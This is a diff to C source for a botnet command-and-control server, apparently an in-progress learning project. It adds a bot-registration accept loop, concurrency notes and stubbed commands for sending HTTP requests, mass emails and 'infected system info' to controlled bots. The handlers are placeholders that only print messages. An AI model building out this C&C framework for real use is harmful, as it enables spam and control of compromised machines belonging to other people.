@@ -13,22 +13,43 @@
 #include <stdio.h>
 #include <stdbool.h>
 
-// BOT
+// BRAINSTORMING
+
+/*
+    p1 -> always on, get commands from cli and execute them
+    p2 -> alway on, accept connections from bot in order to register themc -> P2_CONN TCP
+
+    p1 and p2 need to access a shared resource (active_bots):
+    - p2 write on in -> producer
+    - p1 read from it and update its contents -> consumer
+
+    should I create a c1 process (child of p1)  or a p3 process
+    that leaves a open UDP connection in order 
+    to update bots active state?
+
+    active_bots -> Critical section
+    botExists, list_botnet , sendCommand -> unsafe for now
+*/
+
+
+// BOT -> Critical section
 typedef struct
 {
-    struct sockaddr_in bot_address; // in_addr ?
-    struct in_addr target_address;
-    char action[10];
     int bot_id;
     unsigned short int ports[3];
+    struct sockaddr_in bot_address; // in_addr ?
+
+    // If these two fields are not null the bot is active else not
+    struct in_addr target_address;
+    char action[10];
 
     active_bots *next;
 } active_bots;
 
 active_bots *botnet;
 
-void list_botnet(bool only_id);
 bool botExists(int bot_id);
+void list_botnet(bool active);
 void sendCommand(char* command, int bot_id);
 
 int main(int argc, char const *argv[])
@@ -80,7 +101,34 @@ int main(int argc, char const *argv[])
     else if (pid == 0)
     {
         printf("Child process working,handle bot connection");
-        
+        /*TODO 
+            accept connections,
+             store bot info into active_bots  -> concurrent programming, the botnet struct is the critical section
+             PRODUCER
+             close connection
+
+        */
+        while (1)
+            {
+
+                bot_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&sockaddr_len);
+                if (bot_fd < 0)
+                    handle_error("Cannot open socket for incoming connection");
+
+                // invoke the connection_handler() method to process the request
+                fprintf(stderr, "Incoming connection accepted...\n");
+
+                /*
+
+                    sem_post
+                    storeBot
+                    sem_wait
+                */
+                
+                connection_handler(bot_fd);
+
+                fprintf(stderr, "Done!\n");
+            }
     }
     else
     {
@@ -96,8 +144,17 @@ int main(int argc, char const *argv[])
 
             if (strcmp(command, LIST) == 0)
             {
-                printf("Listing bots beloging to current botnet");
-                list_botnet(false);
+                printf("Listing active bots of current botnet");
+                // sem_wait
+                list_botnet(true);
+                // sem_post
+            }
+
+            if (strcmp(command, QUIT) == 0)
+            {
+                printf("Stop C&C");
+                free(botnet);
+                exit(EXIT_SUCCESS);
             }
             // maybe just one or multiple | statements
 
@@ -105,7 +162,9 @@ int main(int argc, char const *argv[])
             {
                 printf("Choose bot to which send command");
                 
-                list_botnet(true);
+                // sem_wait
+                list_botnet(false);
+                // sem_post
 
                 char bot_id[100];
                 fgets(bot_id,100,stdin);
@@ -130,32 +189,23 @@ int main(int argc, char const *argv[])
         }
     }
 
-    while (1)
-    {
-
-        bot_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&sockaddr_len);
-        if (bot_fd < 0)
-            handle_error("Cannot open socket for incoming connection");
-
-        // invoke the connection_handler() method to process the request
-        fprintf(stderr, "Incoming connection accepted...\n");
-
-        connection_handler(bot_fd);
-
-        fprintf(stderr, "Done!\n");
-    }
+    
 
     return 0;
 }
 
-void list_botnet(bool only_id)
+/*
+    active == true -> list active bots
+    active == false -> list all registered bots
+*/
+void list_botnet(bool active)
 {
 
     active_bots *bot = botnet;
 
     while (bot != NULL)
     {
-        if (only_id == false)
+        if (active == true)
         {
 
             char bot_ip[INET_ADDRSTRLEN];
@@ -188,7 +238,32 @@ bool botExists(int bot_id){
     }
     return false;
 }
+
+/* 
+* Instanciate TCP connection in order to track current bots -> another fork?
+* email -> send array of email addresses, content 
+* HTTP_REQ -> send http request as string "e.g curl ..." 
+* SYS_INFO -> nothing
+*/
 void sendCommand(char* command, int bot_id){
+
+
+    if (strcmp(command, HTTP_REQ) == 0){
+      printf("Sending http request ");
+
+      return;
+    }
+
+    if( strcmp(command, EMAIL) == 0){
+      printf("Sending emails ");
+        // TODO from: to: subject: content:
+      return;
+    }
+    if(strcmp(command, SYS_INFO) == 0){
+      printf("Retrieving infected system info ");
+
+      return;
+    }
 
 
 
